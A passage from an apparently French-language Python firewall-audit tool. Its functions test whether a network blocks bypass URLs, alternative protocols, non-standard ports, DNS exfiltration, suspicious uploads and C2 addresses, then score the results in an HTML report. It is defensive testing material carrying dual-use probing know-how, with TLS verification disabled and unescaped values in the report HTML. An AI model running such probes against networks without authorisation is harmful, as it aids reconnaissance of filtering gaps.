        r["http_code"] = resp.status_code
        if resp.status_code in (400,403,406,429,444,451,503):
            r["blocked"]=True; r["details"]=f"HTTP {resp.status_code} — Bloqué WAF/IPS"
        else:
            r["details"]=f"HTTP {resp.status_code} — Passé"
    except requests.exceptions.ConnectionError:
        r["blocked"]=True; r["details"]="Connexion refusée"
    except requests.exceptions.Timeout:
        r["blocked"]=True; r["details"]="Timeout"
    except Exception as e:
        r["status"]="error"; r["details"]=str(e)[:80]
    r["status"] = "blocked" if r["blocked"] else "not_blocked"
    r["duration_ms"] = round((time.time()-t0)*1000)
    return r


# ═══════════════════════════════════════════════════════════════════════════════
# RUNNERS — NOUVEAUX MODULES
# ═══════════════════════════════════════════════════════════════════════════════

CONFIDENCE = {True: "certain", False: "incertain"}

def _confidence_url(r):
    """Score de confiance basé sur le code HTTP et le type de blocage."""
    if r.get("status") == "error":
        return "incertain"
    blocked = r.get("blocked", False)
    code    = r.get("http_code")
    if blocked and code is None:
        return "certain"      # connexion coupée = certain
    if blocked and code in (403, 407, 451):
        return "certain"      # code proxy/FW explicite
    if blocked and code in (503, 429):
        return "probable"
    if not blocked and code == 200:
        return "certain"
    return "probable"

def run_bypass_test(name, url_or_domain, technique, expected_blocked, description):
    r = {"name": name, "url": url_or_domain, "technique": technique,
         "description": description, "status": None,
         "blocked": False, "http_code": None,
         "confidence": "incertain", "details": "", "duration_ms": 0}
    t0 = time.time()
    try:
        resp = requests.get(url_or_domain, timeout=TIMEOUT, verify=False,
                            proxies=PROXIES,
                            headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"},
                            allow_redirects=True)
        r["http_code"] = resp.status_code
        if resp.status_code in (403, 407, 451, 503):
            r["blocked"] = True
            r["details"] = f"HTTP {resp.status_code} — Bloqué"
        else:
            r["details"] = f"HTTP {resp.status_code} — Bypass possible ⚠️"
    except requests.exceptions.ConnectionError:
        r["blocked"] = True; r["details"] = "Connexion refusée — bloqué"
    except requests.exceptions.Timeout:
        r["blocked"] = True; r["details"] = "Timeout — bloqué"
    except Exception as e:
        r["status"] = "error"; r["details"] = str(e)[:80]
    r["status"]     = "blocked" if r["blocked"] else "not_blocked"
    r["confidence"] = _confidence_url(r)
    r["duration_ms"] = round((time.time() - t0) * 1000)
    return r


def run_protocol_test(name, host, port, protocol, expected_blocked, description):
    r = {"name": name, "host": host, "port": port, "protocol": protocol,
         "description": description, "status": None,
         "blocked": False, "confidence": "incertain",
         "details": "", "duration_ms": 0}
    t0 = time.time()

    def tcp_probe():
        s = socket.create_connection((host, port), timeout=TIMEOUT)
        s.close()

    def ws_probe():
        """Handshake WebSocket minimal."""
        import base64, hashlib
        key = base64.b64encode(b"FirewallTest1234").decode()
        s = socket.create_connection((host, port), timeout=TIMEOUT)
        req = (
            f"GET / HTTP/1.1\r\nHost: {host}\r\n"
            f"Upgrade: websocket\r\nConnection: Upgrade\r\n"
            f"Sec-WebSocket-Key: {key}\r\n"
            f"Sec-WebSocket-Version: 13\r\n\r\n"
        )
        s.sendall(req.encode())
        data = s.recv(512).decode(errors="ignore")
        s.close()
        return "101" in data  # Switching Protocols

    try:
        if protocol in ("ftp", "ftp_alt"):
            tcp_probe()
            r["details"] = f"FTP {host}:{port} — TCP reachable ⚠️"
        elif protocol in ("ssh", "ssh_alt"):
            tcp_probe()
            r["details"] = f"SSH {host}:{port} — TCP reachable ⚠️"
        elif protocol in ("mqtt", "mqtt_tls"):
            tcp_probe()
            r["details"] = f"MQTT {host}:{port} — TCP reachable ⚠️"
        elif protocol == "websocket":
            try:
                ws_probe()
                r["details"] = "WebSocket ws:// — handshake accepté ⚠️"
            except Exception:
                tcp_probe()
                r["details"] = "TCP reachable mais WS rejeté"
        elif protocol == "wss":
            tcp_probe()
            r["details"] = f"WSS {host}:{port} — TCP reachable (TLS)"
        else:
            tcp_probe()
            r["details"] = f"TCP {host}:{port} — reachable ⚠️"
    except ConnectionRefusedError:
        r["blocked"] = True; r["status"] = "refused"
        r["details"] = "Connexion refusée par l'hôte"
        r["confidence"] = "probable"
    except socket.timeout:
        r["blocked"] = True; r["status"] = "timeout"
        r["details"] = "Timeout — pare-feu"
        r["confidence"] = "certain"
    except OSError as e:
        r["blocked"] = True; r["status"] = "blocked"
        r["details"] = f"OS error: {e}"
        r["confidence"] = "certain"

    if not r["blocked"]:
        r["confidence"] = "certain"  # connexion établie = certain non bloqué
    r["status"]      = r["status"] or ("blocked" if r["blocked"] else "reachable")
    r["duration_ms"] = round((time.time() - t0) * 1000)
    return r


def run_nonstandard_port_test(name, host, port, category, expected_blocked, description):
    r = {"name": name, "host": host, "port": port, "category": category,
         "description": description, "status": None,
         "blocked": False, "confidence": "incertain",
         "details": "", "duration_ms": 0}
    t0 = time.time()
    try:
        s = socket.create_connection((host, port), timeout=TIMEOUT)
        s.close()
        r["details"]    = f"Port {port} ouvert — NOT blocked ⚠️"
        r["confidence"] = "certain"
    except ConnectionRefusedError:
        r["blocked"] = True; r["status"] = "refused"
        r["details"] = "Refusé par l'hôte (peut être FW ou service absent)"
        r["confidence"] = "probable"
    except socket.timeout:
        r["blocked"] = True; r["status"] = "timeout"
        r["details"] = "Timeout — pare-feu"
        r["confidence"] = "certain"
    except OSError as e:
        r["blocked"] = True; r["status"] = "blocked"
        r["details"] = f"Bloqué: {e}"
        r["confidence"] = "certain"
    r["status"]      = r["status"] or ("blocked" if r["blocked"] else "reachable")
    r["duration_ms"] = round((time.time() - t0) * 1000)
    return r


def run_dns_exfil_test(name, query, qtype, expected_blocked, description):
    r = {"name": name, "domain": query, "qtype": qtype,
         "description": description, "status": None,
         "blocked": False, "confidence": "incertain",
         "resolved": [], "details": "", "duration_ms": 0}
    t0 = time.time()
    SINKHOLES = {"0.0.0.0", "127.0.0.1", "::1", "146.112.61.106", "52.2.4.6"}
    try:
        if qtype == "TXT":
            # getaddrinfo ne gère pas TXT — on tente via nslookup/dig si dispo
            import subprocess
            cmd = ["nslookup", "-type=TXT", query] if platform.system()=="Windows"                   else ["dig", "+short", "TXT", query]
            proc = subprocess.run(cmd, capture_output=True, text=True, timeout=TIMEOUT)
            out  = proc.stdout.strip()
            if out and "can't find" not in out and "NXDOMAIN" not in out:
                r["details"]    = f"TXT résolu: {out[:80]}"
                r["confidence"] = "certain"
            else:
                r["blocked"]    = True
                r["details"]    = "TXT bloqué / NXDOMAIN"
                r["confidence"] = "certain"
        else:
            addrs = socket.getaddrinfo(query, None)
            ips   = list(set(a[4][0] for a in addrs))
            r["resolved"] = ips
            sinkholed = any(ip in SINKHOLES for ip in ips)
            if sinkholed:
                r["blocked"]    = True
                r["details"]    = f"Sinkholed → {ips}"
                r["confidence"] = "certain"
            elif expected_blocked:
                r["details"]    = f"Résolu → {ips} — NON bloqué ⚠️"
                r["confidence"] = "certain"
            else:
                r["details"]    = f"Résolu → {ips}"
                r["confidence"] = "certain"
    except socket.gaierror:
        r["blocked"]    = True
        r["details"]    = "NXDOMAIN / refusé"
        r["confidence"] = "certain"
    except FileNotFoundError:
        r["details"]    = "dig/nslookup absent — test ignoré"
        r["confidence"] = "incertain"
    except Exception as e:
        r["status"] = "error"; r["details"] = str(e)[:80]
        r["confidence"] = "incertain"
    r["status"]      = r["status"] or ("blocked" if r["blocked"] else "resolved")
    r["duration_ms"] = round((time.time() - t0) * 1000)
    return r


def run_upload_test(name, url, filename, content_bytes, mimetype, expected_blocked, description):
    r = {"name": name, "url": url, "filename": filename,
         "description": description, "status": None,
         "blocked": False, "http_code": None,
         "confidence": "incertain", "details": "", "duration_ms": 0}
    t0 = time.time()
    try:
        files = {"file": (filename, content_bytes, mimetype)}
        resp  = requests.post(url, files=files, timeout=TIMEOUT, verify=False,
                              proxies=PROXIES,
                              headers={"User-Agent": "FirewallTester/3.0"})
        r["http_code"] = resp.status_code
        if resp.status_code in (400, 403, 406, 415, 451, 503):
            r["blocked"]    = True
            r["details"]    = f"HTTP {resp.status_code} — Upload bloqué ✅"
            r["confidence"] = "certain"
        else:
            r["details"]    = f"HTTP {resp.status_code} — Upload accepté ⚠️"
            r["confidence"] = "certain"
    except requests.exceptions.ConnectionError:
        r["blocked"]    = True
        r["details"]    = "Connexion refusée — bloqué"
        r["confidence"] = "certain"
    except requests.exceptions.Timeout:
        r["blocked"]    = True
        r["details"]    = "Timeout"
        r["confidence"] = "probable"
    except Exception as e:
        r["status"] = "error"; r["details"] = str(e)[:80]
    r["status"]      = "blocked" if r["blocked"] else "not_blocked"
    r["duration_ms"] = round((time.time() - t0) * 1000)
    return r


def run_bandwidth_test(name, url, min_kbps, category, description):
    r = {"name": name, "url": url, "category": category,
         "description": description, "status": None,
         "blocked": False, "speed_kbps": 0,
         "confidence": "incertain", "details": "", "duration_ms": 0}
    t0 = time.time()
    try:
        resp     = requests.get(url, timeout=15, verify=False,
                                proxies=PROXIES, stream=True,
                                headers={"User-Agent": "FirewallTester/3.0"})
        received = 0
        dl_start = time.time()
        for chunk in resp.iter_content(65536):
            received += len(chunk)
            if received >= 2_000_000 or (time.time() - dl_start) > 8:
                break
        elapsed    = time.time() - dl_start
        kbps       = round((received / 1024) / elapsed) if elapsed > 0 else 0
        r["speed_kbps"] = kbps
        if resp.status_code in (403, 407, 451, 503):
            r["blocked"] = True
            r["details"] = f"HTTP {resp.status_code} — Bloqué"
            r["confidence"] = "certain"
        elif kbps < min_kbps:
            r["details"]    = f"⚠️  {kbps} KB/s < seuil {min_kbps} KB/s — throttling probable"
            r["confidence"] = "probable"
        else:
            r["details"]    = f"✅ {kbps} KB/s — OK (seuil {min_kbps} KB/s)"
            r["confidence"] = "certain"
    except requests.exceptions.ConnectionError:
        r["blocked"] = True; r["details"] = "Connexion refusée"
        r["confidence"] = "certain"
    except requests.exceptions.Timeout:
        r["details"] = "Timeout — accès très lent ou bloqué"
        r["confidence"] = "probable"
    except Exception as e:
        r["status"] = "error"; r["details"] = str(e)[:80]
    r["status"]      = r["status"] or ("blocked" if r["blocked"] else "reachable")
    r["duration_ms"] = round((time.time() - t0) * 1000)
    return r

# ═══════════════════════════════════════════════════════════════════════════════
# ORCHESTRATOR
# ═══════════════════════════════════════════════════════════════════════════════

def run_all_tests(modules=None, verbose=False, progress_cb=None):
    all_modules = ["url","eicar","c2","dns","ssl","app","bypass","proto","ports","dns_exfil","upload","bandwidth"]
    if modules is None: modules = all_modules

    results = {
        "meta": {
            "tool":"FirewallTester","version":VERSION,
            "hostname":socket.gethostname(),
            "os":platform.system()+" "+platform.release(),
            "timestamp":datetime.datetime.now().isoformat(),
            "proxy": list(PROXIES.values())[0] if PROXIES else "none",
        },
        "modules": {}
    }

    def pr(icon, name, details):
        if verbose: print(f"  {icon}  {name:<52} {details}")

    def is_pass(t):
        cat, blocked = t.get("category",""), t.get("blocked",False)
        return (not blocked) if cat in NEUTRAL_CATS else blocked

    if "url" in modules:
        print("\n[*] URL / Web Policy Filtering")
        out = []
        with ThreadPoolExecutor(max_workers=12) as ex:
            futs = {ex.submit(run_url_test,*t):t for t in URL_FILTER_TESTS}
            for f in as_completed(futs):
                r = f.result(); ok = is_pass(r)
                pr("✅" if ok else "❌", r["name"], r["details"]); out.append(r)
                if progress_cb: progress_cb()
        results["modules"]["url_filter"] = out

    if "eicar" in modules:
        print("\n[*] EICAR / Malware Downloads")
        out = []
        for t in EICAR_TESTS:
            r = run_eicar_test(*t)
            pr("✅" if r["blocked"] else "❌", r["name"], r["details"]); out.append(r)
            if progress_cb: progress_cb()
        results["modules"]["eicar"] = out

    if "c2" in modules:
        print("\n[*] C2 / Malicious IPs")
        out = []
        with ThreadPoolExecutor(max_workers=6) as ex:
            futs = {ex.submit(run_c2_test,*t):t for t in C2_IP_TESTS}
            for f in as_completed(futs):
                r = f.result()
                pr("✅" if r["blocked"] else "❌", r["name"], r["details"]); out.append(r)
                if progress_cb: progress_cb()
        results["modules"]["c2_ip"] = out

    if "dns" in modules:
        print("\n[*] DNS Filtering")
        out = []
        with ThreadPoolExecutor(max_workers=6) as ex:
            futs = {ex.submit(run_dns_test,*t):t for t in DNS_TESTS}
            for f in as_completed(futs):
                r = f.result(); ok = is_pass(r)
                pr("✅" if ok else "❌", r["name"], r["details"]); out.append(r)
                if progress_cb: progress_cb()
        results["modules"]["dns"] = out

    if "ssl" in modules:
        print("\n[*] SSL / TLS Inspection")
        out = []
        with ThreadPoolExecutor(max_workers=6) as ex:
            futs = {ex.submit(run_ssl_test,*t):t for t in SSL_TESTS}
            for f in as_completed(futs):
                r = f.result(); ok = is_pass(r)
                pr("✅" if ok else "❌", r["name"], r["details"]); out.append(r)
                if progress_cb: progress_cb()
        results["modules"]["ssl"] = out

    if "app" in modules:
        print("\n[*] Application Layer — WAF/IPS")
        out = []
        with ThreadPoolExecutor(max_workers=4) as ex:
            futs = {ex.submit(run_app_layer_test,*t):t for t in APP_LAYER_TESTS}
            for f in as_completed(futs):
                r = f.result(); ok = is_pass(r)
                pr("✅" if ok else "❌", r["name"], r["details"]); out.append(r)
                if progress_cb: progress_cb()
        results["modules"]["app_layer"] = out


    if "bypass" in modules:
        print("\n[*] Bypass / Contournement de filtrage")
        out = []
        with ThreadPoolExecutor(max_workers=8) as ex:
            futs = {ex.submit(run_bypass_test,*t):t for t in BYPASS_TESTS}
            for f in as_completed(futs):
                r = f.result(); ok = r["blocked"]
                conf = r.get("confidence","?")
                pr("✅" if ok else "❌", r["name"], f"{r['details']} [{conf}]"); out.append(r)
                if progress_cb: progress_cb()
        results["modules"]["bypass"] = out

    if "proto" in modules:
        print("\n[*] Protocoles alternatifs")
        out = []
        with ThreadPoolExecutor(max_workers=6) as ex:
            futs = {ex.submit(run_protocol_test,*t):t for t in PROTOCOL_TESTS}
            for f in as_completed(futs):
                r = f.result(); ok = r["blocked"]
                conf = r.get("confidence","?")
                pr("✅" if ok else "❌", r["name"], f"{r['details']} [{conf}]"); out.append(r)
                if progress_cb: progress_cb()
        results["modules"]["protocols"] = out

    if "ports" in modules:
        print("\n[*] Ports non standard")
        out = []
        with ThreadPoolExecutor(max_workers=8) as ex:
            futs = {ex.submit(run_nonstandard_port_test,*t):t for t in NON_STANDARD_PORT_TESTS}
            for f in as_completed(futs):
                r = f.result(); ok = r["blocked"]
                conf = r.get("confidence","?")
                pr("✅" if ok else "❌", r["name"], f"{r['details']} [{conf}]"); out.append(r)
                if progress_cb: progress_cb()
        results["modules"]["nonstandard_ports"] = out

    if "dns_exfil" in modules:
        print("\n[*] Exfiltration DNS")
        out = []
        for t in DNS_EXFIL_TESTS:
            r = run_dns_exfil_test(*t)
            cat = r.get("qtype","")
            ok  = r["blocked"] if t[3] else not r["blocked"]
            conf = r.get("confidence","?")
            pr("✅" if ok else "❌", r["name"], f"{r['details']} [{conf}]"); out.append(r)
            if progress_cb: progress_cb()
        results["modules"]["dns_exfil"] = out

    if "upload" in modules:
        print("\n[*] Upload de fichiers suspects")
        out = []
        for t in UPLOAD_TESTS:
            r = run_upload_test(*t)
            cat = "neutral_upload" if not t[5] else "upload"
            ok  = (not r["blocked"]) if not t[5] else r["blocked"]
            conf = r.get("confidence","?")
            pr("✅" if ok else "❌", r["name"], f"{r['details']} [{conf}]"); out.append(r)
            if progress_cb: progress_cb()
        results["modules"]["upload"] = out

    if "bandwidth" in modules:
        print("\n[*] Bandwidth / QoS")
        out = []
        with ThreadPoolExecutor(max_workers=3) as ex:
            futs = {ex.submit(run_bandwidth_test,*t):t for t in BANDWIDTH_TESTS}
            for f in as_completed(futs):
                r = f.result()
                conf = r.get("confidence","?")
                pr("📶", r["name"], f"{r['details']} [{conf}]"); out.append(r)
                if progress_cb: progress_cb()
        results["modules"]["bandwidth"] = out

    return results

# ═══════════════════════════════════════════════════════════════════════════════
# SCORING + RECOMMANDATIONS
# ═══════════════════════════════════════════════════════════════════════════════

def compute_score(results):
    labels = {
        "url_filter":        "URL / Web Policy",
        "eicar":             "EICAR / Malware",
        "c2_ip":             "C2 / IPs",
        "dns":               "DNS Filtering",
        "ssl":               "SSL Inspection",
        "app_layer":         "App Layer / WAF",
        "bypass":            "Bypass / Contournement",
        "protocols":         "Protocoles alternatifs",
        "nonstandard_ports": "Ports non standard",
        "dns_exfil":         "Exfiltration DNS",
        "upload":            "Upload fichiers suspects",
        "bandwidth":         "Bandwidth / QoS",
    }
    score_data = {}; total_tests = total_passed = 0
    for mod_key, tests in results["modules"].items():
        passed = total = 0
        for t in tests:
            cat = t.get("category",""); blocked = t.get("blocked",False)
            total += 1
            # bandwidth = pas de notion bloqué/pas bloqué, on évalue la vitesse
            if mod_key == "bandwidth":
                if t.get("speed_kbps",0) > 0 or t.get("status") == "blocked":
                    passed += 1  # test exécuté = réussi (info collectée)
            elif cat in NEUTRAL_CATS or cat == "neutral_upload":
                if not blocked: passed += 1
            else:
                if blocked: passed += 1
        pct = round(passed/total*100) if total else 0
        score_data[mod_key] = {"label":labels.get(mod_key,mod_key),
                                "passed":passed,"total":total,"pct":pct}
        total_tests += total; total_passed += passed
    gp = round(total_passed/total_tests*100) if total_tests else 0
    score_data["_global"] = {"passed":total_passed,"total":total_tests,"pct":gp}
    return score_data

def compute_recommendations(results):
    """Génère des recommandations avec sévérité basées sur les résultats URL."""
    recs = []
    url_tests = results["modules"].get("url_filter",[])
    cat_fails = defaultdict(int)
    cat_total = defaultdict(int)
    for t in url_tests:
        cat = t.get("category","")
        if cat in NEUTRAL_CATS: continue
        cat_total[cat] += 1
        if not t.get("blocked", False):
            cat_fails[cat] += 1
    for cat, fail_count in cat_fails.items():
        if fail_count == 0: continue
        total = cat_total[cat]
        meta  = CATEGORY_META.get(cat, {})
        sev   = meta.get("severity","minor")
        rec   = RECOMMENDATIONS.get(cat)
        if not rec: continue
        recs.append({
            "category": cat,
            "label":    meta.get("label", cat),
            "color":    meta.get("color","#6b7280"),
            "severity": sev,
            "title":    rec[0],
            "detail":   rec[1],
            "fails":    fail_count,
            "total":    total,
            "pct_fail": round(fail_count/total*100) if total else 0,
        })
    # Tri : critical > major > minor
    order = {"critical":0,"major":1,"minor":2,"none":3}
    recs.sort(key=lambda x: order.get(x["severity"],9))
    return recs

# ═══════════════════════════════════════════════════════════════════════════════
# TUI — Menu interactif terminal
# ═══════════════════════════════════════════════════════════════════════════════

def clear():
    os.system("cls" if platform.system()=="Windows" else "clear")

def tui_menu(config):
    """Menu TUI complet. Retourne (modules, output_path, export_json, proxy_cfg)."""
    selected_modules = {"url","eicar","c2","dns","ssl","app"}
    all_modules = [
        ("url",       "URL / Web Policy Filtering   (108 URLs)"),
        ("eicar",     "EICAR / Malware Downloads    (6 tests) "),
        ("c2",        "C2 / Malicious IPs           (10 tests)"),
        ("dns",       "DNS Filtering                (12 tests)"),
        ("ssl",       "SSL / TLS Inspection         (12 tests)"),
        ("app",       "Application Layer / WAF      (6 tests) "),
        ("bypass",    "Bypass / Contournement       (13 tests)"),
        ("proto",     "Protocoles alternatifs       (10 tests)"),
        ("ports",     "Ports non standard           (12 tests)"),
        ("dns_exfil", "Exfiltration DNS             (5 tests) "),
        ("upload",    "Upload fichiers suspects     (4 tests) "),
        ("bandwidth", "Bandwidth / QoS              (4 tests) "),
    ]
    proxy_cfg  = config.get("proxy", {})
    client_cfg = config.get("client",  {})
    auditor_cfg= config.get("auditor", {})
    audit_cfg  = config.get("audit",   {})
    output_name= f"firewall_report_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.html"
    export_json= False
    export_pdf_flag = False

    while True:
        clear()
        print("╔══════════════════════════════════════════════════════════════╗")
        print("║        🔥  FirewallTester v3.0 — Security Audit Tool        ║")
        print("╠══════════════════════════════════════════════════════════════╣")
        print(f"║  Host  : {socket.gethostname():<52}║")
        print(f"║  OS    : {(platform.system()+' '+platform.release()):<52}║")
        print(f"║  Client: {client_cfg.get('name','—'):<52}║")
        prx_str = list(PROXIES.values())[0] if PROXIES else "aucun (direct)"
        prx_disp = prx_str[:52] if len(prx_str) > 52 else prx_str
        print(f"║  Proxy : {prx_disp:<52}║")
        print("╠══════════════════════════════════════════════════════════════╣")
        print("║  MODULES                                                     ║")
        keys_display = ["1","2","3","4","5","6","7","8","9","B","D","E"]
        for i,(key,desc) in enumerate(all_modules):
            chk = "✅" if key in selected_modules else "⬜"
            lbl = keys_display[i] if i < len(keys_display) else "?"
            print(f"║  [{lbl}] {chk} {desc:<53}║")
        print("╠══════════════════════════════════════════════════════════════╣")
        print(f"║  [7] Rapport : {output_name:<47}║")
        json_chk = "✅" if export_json else "⬜"
        print(f"║  [8] Export JSON : {json_chk:<43}║")
        pdf_chk  = "✅" if export_pdf_flag else "⬜"
        print(f"║  [P] Export PDF  : {pdf_chk:<43}║")
        print("╠══════════════════════════════════════════════════════════════╣")
        print("║  [9] Configurer le proxy                                     ║")
        print("║  [C] Infos client / auditeur                                 ║")
        print("║  [A] Tout sélectionner / Tout désélectionner                 ║")
        print("╠══════════════════════════════════════════════════════════════╣")
        print("║  [ENTRÉE] Lancer l'audit   [Q] Quitter                       ║")
        print("╚══════════════════════════════════════════════════════════════╝")
        print()
        choice = input("  Choix > ").strip().upper()

        # Modules 1-9 et lettres pour 10-12
        module_keys_map = {str(i+1): i for i in range(9)}
        module_keys_map.update({"B": 9, "D": 10, "E": 11})
        if choice in module_keys_map:
            idx = module_keys_map[choice]
            if idx < len(all_modules):
                key = all_modules[idx][0]
                if key in selected_modules: selected_modules.remove(key)
                else: selected_modules.add(key)

        elif choice == "7":
            clear()
            n = input(f"  Nom du fichier rapport [{output_name}] : ").strip()
            if n: output_name = n if n.endswith(".html") else n+".html"

        elif choice == "8":
            export_json = not export_json

        elif choice == "P":
            export_pdf_flag = not export_pdf_flag

        elif choice == "9":
            clear()
            print("  ── Configuration Proxy ──────────────────────────────")
            sys_proxy = detect_system_proxy()
            if sys_proxy:
                print(f"  Proxy système détecté : {sys_proxy}")
                use = input("  Utiliser ce proxy ? [O/n] : ").strip().lower()
                if use != "n":
                    PROXIES.clear(); PROXIES.update({"http":sys_proxy,"https":sys_proxy})
                    proxy_cfg["enabled"]=True; proxy_cfg["url"]=sys_proxy
                    input("  ✅ Proxy système configuré. Appuyez sur Entrée…"); continue
            print("  Format : http://proxy:port  ou  http://user:pass@proxy:port")
            print("  Laisser vide pour connexion directe")
            url = input("  URL Proxy : ").strip()
            PROXIES.clear()
            if url:
                PROXIES.update({"http":url,"https":url})
                proxy_cfg["enabled"]=True; proxy_cfg["url"]=url
            else:
                proxy_cfg["enabled"]=False
            input("  ✅ Proxy mis à jour. Appuyez sur Entrée…")

        elif choice == "C":
            clear()
            print("  ── Infos Client / Auditeur ──────────────────────────")
            n = input(f"  Nom client [{client_cfg.get('name','—')}] : ").strip()
            if n: client_cfg["name"] = n
            n = input(f"  URL logo client (optionnel) [{client_cfg.get('logo_url','')}] : ").strip()
            if n: client_cfg["logo_url"] = n
            n = input(f"  Auditeur [{auditor_cfg.get('name','—')}] : ").strip()
            if n: auditor_cfg["name"] = n
            n = input(f"  ESN / Cabinet [{auditor_cfg.get('company','—')}] : ").strip()
            if n: auditor_cfg["company"] = n
            n = input(f"  Titre audit [{audit_cfg.get('title','Audit Pare-feu')}] : ").strip()
            if n: audit_cfg["title"] = n
            config["client"]=client_cfg; config["auditor"]=auditor_cfg; config["audit"]=audit_cfg
            input("  ✅ Infos mises à jour. Appuyez sur Entrée…")

        elif choice == "A":
            if len(selected_modules) == len(all_modules):
                selected_modules.clear()
            else:
                selected_modules = {k for k,_ in all_modules}  # tous les 12 modules

        elif choice == "Q":
            print("\n  Au revoir.\n"); sys.exit(0)

        elif choice == "":
            if not selected_modules:
                input("  ⚠️  Sélectionnez au moins un module. Appuyez sur Entrée…")
                continue
            clear()
            return list(selected_modules), output_name, export_json, export_pdf_flag, config

# ═══════════════════════════════════════════════════════════════════════════════
# HTML REPORT
# ═══════════════════════════════════════════════════════════════════════════════

# Chart.js minifié inline (évite tout CDN)
CHARTJS_MIN = """
/* Chart.js 4.x inline placeholder — on génère du SVG natif à la place */
"""

def pct_color(p):
    return "#22c55e" if p>=80 else ("#f59e0b" if p>=50 else "#ef4444")

def conf_badge(conf):
    """Badge score de confiance : certain / probable / incertain."""
    colors = {
        "certain":   ("#14532d","#86efac","CERTAIN"),
        "probable":  ("#431407","#fdba74","PROBABLE"),
        "incertain": ("#1e1b4b","#a5b4fc","INCERTAIN"),
    }
    bg,fg,lbl = colors.get(conf, ("#374151","#9ca3af",str(conf).upper()))
    return f'<span style="background:{bg};color:{fg};padding:.12rem .45rem;border-radius:999px;font-size:.6rem;font-weight:700;letter-spacing:.4px">{lbl}</span>'

def sev_badge(sev):
    colors = {"critical":("#7f1d1d","#fca5a5","CRITIQUE"),
               "major":  ("#431407","#fdba74","MAJEUR"),
               "minor":  ("#1e3a5f","#93c5fd","MINEUR"),
               "none":   ("#14532d","#86efac","OK")}
    bg,fg,lbl = colors.get(sev,("#374151","#9ca3af",sev.upper()))
    return f'<span style="background:{bg};color:{fg};padding:.15rem .55rem;border-radius:999px;font-size:.65rem;font-weight:700;letter-spacing:.5px">{lbl}</span>'

def svg_donut(blocked, total, color):
    """Génère un SVG camembert simple blocked/not-blocked."""
    if total == 0: return ""
    not_blocked = total - blocked
    r = 30; cx = cy = 40; stroke = 12
    circ = 2 * 3.14159 * r
    if total > 0:
        dash_blocked     = round(circ * blocked / total, 2)
        dash_not_blocked = round(circ * not_blocked / total, 2)
    else:
        dash_blocked = dash_not_blocked = 0
    pct = round(blocked/total*100) if total else 0
    pc  = "#22c55e" if pct>=80 else ("#f59e0b" if pct>=50 else "#ef4444")
    return f"""<svg width="80" height="80" viewBox="0 0 80 80">
  <circle cx="{cx}" cy="{cy}" r="{r}" fill="none" stroke="#1f2937" stroke-width="{stroke}"/>
  <circle cx="{cx}" cy="{cy}" r="{r}" fill="none" stroke="#dc2626" stroke-width="{stroke}"
    stroke-dasharray="{dash_not_blocked} {circ}" stroke-dashoffset="0"
    transform="rotate(-90 {cx} {cy})"/>
  <circle cx="{cx}" cy="{cy}" r="{r}" fill="none" stroke="#22c55e" stroke-width="{stroke}"
    stroke-dasharray="{dash_blocked} {circ}" stroke-dashoffset="{-dash_not_blocked}"
    transform="rotate(-90 {cx} {cy})"/>
  <text x="{cx}" y="{cy+1}" text-anchor="middle" dominant-baseline="middle"
    font-size="11" font-weight="700" fill="{pc}">{pct}%</text>
</svg>"""

def generate_html_report(results, score_data, recs, config, output_path):
    ts       = results["meta"]["timestamp"]
    hostname = results["meta"]["hostname"]
    os_info  = results["meta"]["os"]
    proxy_info = results["meta"].get("proxy","none")
    g        = score_data["_global"]
    gc       = pct_color(g["pct"])
    gl       = "A" if g["pct"]>=90 else ("B" if g["pct"]>=75 else ("C" if g["pct"]>=60 else ("D" if g["pct"]>=40 else "F")))

    client   = config.get("client",  {})
    auditor  = config.get("auditor", {})
    audit    = config.get("audit",   {})

    logo_html = ""
    if client.get("logo_url"):
        logo_html = f'<img src="{client["logo_url"]}" alt="logo" style="height:40px;object-fit:contain;border-radius:4px">'

    def is_pass(t):
        cat, blocked = t.get("category",""), t.get("blocked",False)
        return (not blocked) if cat in NEUTRAL_CATS else blocked

    # ── Score bars ─────────────────────────────────────────────────────────────
    score_bars = ""
    for k,v in score_data.items():
        if k.startswith("_"): continue
        p=v["pct"]; c=pct_color(p)
        score_bars += f'''<div class="mod-score">
          <span class="mod-label">{v["label"]}</span>
          <div class="bar-wrap"><div class="bar-fill" style="width:{p}%;background:{c}"></div></div>
          <span class="mod-pct" style="color:{c}">{v["passed"]}/{v["total"]} ({p}%)</span>
        </div>'''

    # ── URL accordion ──────────────────────────────────────────────────────────
    url_tests = results["modules"].get("url_filter",[])
    cat_groups = defaultdict(list)
    for t in url_tests: cat_groups[t["category"]].append(t)

    accordion_html = ""
    for cat, tests in sorted(cat_groups.items()):
        meta    = CATEGORY_META.get(cat,{"label":cat,"color":"#6b7280","severity":"minor"})
        color   = meta["color"]
        total   = len(tests)
        passed  = sum(1 for t in tests if is_pass(t))
        blocked_n   = sum(1 for t in tests if t.get("blocked"))
        unblocked_n = total - blocked_n
        pct     = round(passed/total*100) if total else 0
        pc      = pct_color(pct)
        uid     = f"cat_{cat}"
        donut   = svg_donut(blocked_n, total, color)

        rows = ""
        for t in sorted(tests, key=lambda x: x["name"]):
            ok = is_pass(t); rc = "#16a34a" if ok else "#dc2626"
            icon = "✅" if ok else "❌"
            rows += f'''<tr>
              <td style="color:{rc};font-size:1.05em;width:28px">{icon}</td>
              <td class="td-name">{t["name"]}</td>
              <td class="td-url"><a href="{t["url"]}" target="_blank" rel="noopener">{t["url"]}</a></td>
              <td style="color:{rc}">{t["details"]}</td>
              <td style="color:#6b7280;white-space:nowrap">{t["duration_ms"]} ms</td>
            </tr>'''

        accordion_html += f'''
        <div class="acc-item">
          <button class="acc-header" onclick="toggleAcc('{uid}')" style="border-left:3px solid {color}">
            <div class="acc-donut">{donut}</div>
            <div class="acc-info">
              <span class="acc-label" style="color:{color}">{meta["label"]}</span>
              <div class="acc-pills">
                <span class="pill pill-block">🚫 {blocked_n} bloqué(s)</span>
                <span class="pill pill-pass">🔓 {unblocked_n} non bloqué(s)</span>
                <span class="pill" style="background:#1f2937;color:{pc}">{pct}% OK</span>
                {sev_badge(meta.get("severity","minor"))}
              </div>
            </div>
            <span class="acc-arrow" id="{uid}_arrow">▶</span>
          </button>
          <div class="acc-body" id="{uid}" style="display:none">
            <table>
              <thead><tr><th></th><th>Nom</th><th>URL</th><th>Résultat</th><th>Temps</th></tr></thead>
              <tbody>{rows}</tbody>
            </table>
          </div>
        </div>'''

    # ── Generic table ──────────────────────────────────────────────────────────
    def build_table(tests, cols):
        rows = ""
        for t in tests:
